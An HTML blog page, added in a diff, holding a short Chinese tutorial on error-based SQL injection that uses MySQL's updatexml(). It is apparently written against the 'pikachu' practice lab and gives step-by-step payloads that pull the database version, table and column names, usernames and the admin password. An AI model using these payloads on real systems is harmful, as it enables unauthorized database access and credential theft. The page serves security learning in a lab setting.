@@ -1,0 +1,219 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>sql注入漏洞之基于报错的方式来利用 | Gridea</title>
+<link rel="shortcut icon" href="https://somebodystark.github.io/favicon.ico?v=1695815481153">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://somebodystark.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="sql注入漏洞之基于报错的方式来利用 | Gridea - Atom Feed" href="https://somebodystark.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="sql基于报错的方式来利用
+
+
+updatexml()： 对xml文档数据进行查询和修改的XPATH函数
+updatexml(xml_doument,XPath_string,new_value)
+第一个参数：XML的内容
+第二个参数：是需..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://somebodystark.github.io">
+  <img class="avatar" src="https://somebodystark.github.io/images/avatar.png?v=1695815481153" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              sql注入漏洞之基于报错的方式来利用
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-09-23
+              </span>
+              <span>
+                2 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h3 id="sql基于报错的方式来利用">sql基于报错的方式来利用</h3>
+<ol>
+<li>
+<p>updatexml()： 对xml文档数据进行查询和修改的XPATH函数</p>
+<p>updatexml(xml_doument,XPath_string,new_value)</p>
+<p>第一个参数：XML的内容<br>
+第二个参数：是需要update的位置XPATH路径<br>
+第三个参数：是更新后的内容</p>
+</li>
+</ol>
+<p>​	所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式</p>
+<ul>
+<li>
+<p>来个单引号，页面出错说明有注入点</p>
+</li>
+<li>
+<p>存在注入，利用updatexml函数，得到数据库版本名构造payload：kobe ' and updatexml(1,concat(0x7e,version()),1)#</p>
+<p>concat在mysql中就是起到连接两个数据作用</p>
+</li>
+<li>
+<p>得到数据库名，payload：kobe' and updatexml(1,concat(0x7e,database()),0)#      **数据库名是pikachu **</p>
+</li>
+<li>
+<p>获取表名，kobe' and updatexml(1,concat(0x7e,(select table_name  from information_schema.tables where table_schema='pikachu')),0)#           **table_schema 是数据库的名称 **</p>
+</li>
+<li>
+<p>回显不能超过一行 则需要用到limit函数  kobe' and updatexml(1,concat(0x7e,(select table_name  from information_schema.tables where table_schema='pikachu' limit 0,1)),0)#             <strong>获得表名 httpinfo member  messsage  users xssblind</strong></p>
+</li>
+<li>
+<p>获取列名    kobe' and updatexml(1,concat(0x7e,(select column_name  from information_schema.columns where table_name='users' limit 0,1)),0)#   <strong>username password</strong></p>
+</li>
+<li>
+<p>根据列名 获取数据  获取username的数据  kobe' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#</p>
+</li>
+<li>
+<p>根据列名 获取数据  获取password的数据   kobe' and updatexml(1,concat(0x7e,(select password from users where username=&quot;admin&quot; limit 0,1)),0)#</p>
+</li>
+</ul>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#sql%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%96%B9%E5%BC%8F%E6%9D%A5%E5%88%A9%E7%94%A8">sql基于报错的方式来利用</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://somebodystark.github.io/post/dai-li-can-shu-de-shi-yong/">
+              <h3 class="post-title">
+                代理参数的使用
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://somebodystark.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
